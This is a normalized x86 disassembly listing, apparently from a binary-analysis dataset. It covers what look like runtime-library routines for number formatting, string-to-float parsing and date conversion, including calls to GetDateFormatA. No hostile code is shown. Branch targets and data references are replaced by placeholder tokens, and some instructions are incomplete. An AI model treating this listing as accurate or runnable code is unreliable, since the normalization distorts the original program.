mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_4086b4
mov edx esi
xchg edx eax
call sub_404500
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408b80
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408bc4
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_408e98
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408cc3
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + sub_408ca0 ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408ccd
call sub_408cc3
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408b80
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_408d29
call sub_408cc3
call sub_408cba
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408cba
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408b80
retn
xor ecx ecx
sub_408d65
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408cba
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408cba
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_408dca
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_408e1e
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_408d65
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_408e98
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_408ec5
jmp r-xdata
call sub_408fe7
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_408ec5
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402c44
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_408fe7
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_4090c4
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_40917b
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_409186
neg edx
mov ecx esi
call sub_409186
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_40917b
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_4091a2
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402c44
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_409186
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_4091a2
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_4091d8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408bc4
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403fa4
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409208
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408bc4
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403fa4
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409254
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404374
mov edx esp
xor ecx ecx
call sub_4090c4
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409280
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404374
mov edx esp
xor ecx ecx
call sub_4090c4
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4092c8
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_40930c
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_40937c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_4092c8
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_4078d4
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_4078d4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_4078d4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4093d8
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409414
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_4093d8
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_4094dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_4092c8
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_4078d4
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_4078d4
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_4078d4
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_4093d8
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409628
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_4094dc
pop esi
pop ecx
pop ebp
retn 0x8
sub_409648
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_4092c8
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409684
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028c8
sub_4096c8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_404174
mov edx eax
mov eax ebx
call sub_409684
pop ecx
pop ebx
pop ebp
retn
sub_4096e8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_4086b4
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409684
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409734
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409760
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409628
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409798
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_40937c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_4097d8
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409926
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403eb4
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f4c
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404374
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40992d
lea eax [ ebp - 0x118 ]
call sub_403eb4
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404124
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_404174
mov edx eax
mov eax [ ebx ]
call sub_40bd1c
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40be90
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_4043d4
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40be2c
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_4040ac
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40be90
mov ecx eax
mov eax ebx
mov edx esi
call sub_403fa4
sub_409940
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409a1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403eb4
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f4c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f4c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409a25
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404124
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404374
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_404174
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4043d4
sub_409a48
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a1c9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a1d0
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403ed8
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40bf10
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40bef0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409684
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40bf10
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409684
pop ecx
mov al [ eax + lookup_table_409b2b ]
jmp [ eax * 4 + jump_table_409b64 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409734
pop ecx
push ebp
call sub_409760
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409734
pop ecx
push ebp
call sub_409760
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_4097d8
pop ecx
mov eax [ ebp - 0x24 ]
call sub_4096c8
pop ecx
jmp r-xdata
push ebp
call sub_409734
pop ecx
push ebp
call sub_409760
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409940
pop ecx
mov eax [ ebp - 0x28 ]
call sub_4096c8
pop ecx
jmp r-xdata
push ebp
call sub_409734
pop ecx
push ebp
call sub_409760
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409734
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409734
pop ecx
push ebp
call sub_409798
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409734
pop ecx
push ebp
call sub_409798
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409734
pop ecx
push ebp
call sub_409798
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409734
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409734
pop ecx
